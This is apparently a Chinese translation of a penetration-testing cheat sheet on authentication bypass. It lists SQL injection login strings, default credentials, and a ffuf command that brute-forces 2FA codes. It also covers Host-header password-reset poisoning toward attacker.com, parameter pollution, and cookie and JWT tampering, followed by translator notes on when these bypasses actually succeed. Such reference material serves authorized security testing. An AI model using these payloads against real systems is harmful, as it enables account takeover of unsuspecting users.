<a id="-authentication-bypass-cheatsheet"></a>
# 🔐 身份验证绕过速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](./README.it.md) • [🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

<a id="-login-bypass-techniques"></a>
## 🔍 登录绕过技巧

<a id="sql-injection"></a>
### SQL 注入
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

<a id="default-credentials"></a>
### 默认凭据
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

<a id="parameter-manipulation"></a>
### 参数篡改
```http
# 修改用户类型
user_type=admin
role=administrator
isAdmin=true
admin=1

# 跳过验证
verified=true
mfa_verified=true
```

---

<a id="-2famfa-bypass"></a>
## 🔑 双因素／多因素身份验证（2FA/MFA）绕过

<a id="response-manipulation"></a>
### 响应篡改
```http
# 将 false 改为 true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

<a id="status-code-manipulation"></a>
### 状态码篡改
```http
# 若返回 401/403，尝试改为 200
# 使用代理修改响应
```

<a id="direct-navigation"></a>
### 直接访问
```http
# 登录后跳过 2FA 页面
/login → /2fa → /dashboard
# 尝试直接访问 /dashboard
```

<a id="code-bruteforce"></a>
### 验证码暴力枚举
```bash
# 4 位验证码
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

<a id="code-reuse"></a>
### 验证码复用
```http
# 尝试使用旧的／已过期的验证码
# 尝试多次使用同一个验证码
```

<a id="nullempty-values"></a>
### null／空值
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

<a id="-password-reset-bypass"></a>
## 🔓 密码重置绕过

<a id="host-header-injection"></a>
### Host 请求头注入
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

<a id="token-manipulation"></a>
### 令牌篡改
```http
# 可预测的令牌
token=1
token=admin
token=base64(user_id)

# 令牌复用
# 将自己的重置令牌与受害者的邮箱组合使用
```

<a id="parameter-pollution"></a>
### 参数污染
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

<a id="response-manipulation-1"></a>
### 响应篡改
```json
// 在响应中查找令牌
{"token": "abc123", "email": "victim@target.com"}
```

---

<a id="-sessioncookie-bypass"></a>
## 🛡️ 会话／Cookie 绕过

<a id="cookie-manipulation"></a>
### Cookie 篡改
```http
# 修改值
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

<a id="jwt-manipulation"></a>
### JWT 篡改
```json
// 修改声明（claims）
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

<a id="session-fixation"></a>
### 会话固定
```http
# 将攻击者的会话设置给受害者
# 受害者使用攻击者的会话 ID 登录
```

---

<a id="-quick-reference"></a>
## 📊 速查

| 绕过类型 | 技术 |
|-------------|-----------|
| 登录 | SQL 注入、默认凭据 |
| 2FA | 响应篡改、暴力枚举 |
| 密码重置 | Host 请求头、令牌复用 |
| 会话 | Cookie 篡改、JWT |

<a id="common-vulnerable-points"></a>
### 常见薄弱点
```
- 登录表单
- 密码重置流程
- 2FA/MFA 实现
- “记住我”功能
- 账户验证
- OAuth 实现
```

---

<a id="-resources"></a>
## 📚 参考资料

- [PortSwigger 身份验证资料](https://portswigger.net/web-security/authentication)
- [HackTricks 身份验证绕过](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 突破身份验证！</b><br>
  <i>仅用于已获授权的测试！</i>
</p>

> 译注：修改客户端收到的状态码或 JSON 响应，只会改变客户端看到的结果；只有服务端错误地信任客户端状态，或未在后续请求中检查身份验证／2FA 状态时，才可能形成实际绕过。应以是否能访问受保护的服务端资源判断，而不是仅看页面是否跳转。直接跳过 2FA 步骤的风险可参见 [PortSwigger 多因素身份验证说明](https://portswigger.net/web-security/authentication/multi-factor#bypassing-two-factor-authentication)。

> 译注：JWT 示例中 role 属于载荷声明，而 alg 属于 JOSE 头；修改任一受保护部分通常都会使原签名失效。alg=none 仅在验证实现或策略存在问题时才可能被利用；[RFC 8725 第 3.1 节](https://www.rfc-editor.org/rfc/rfc8725#section-3.1)要求限制可接受算法并验证实际使用的算法。原文片段保留原样，不代表无需验证条件即可绕过。JSON 块内的 // 注释仅作讲解，标准 JSON 不接受此类注释。
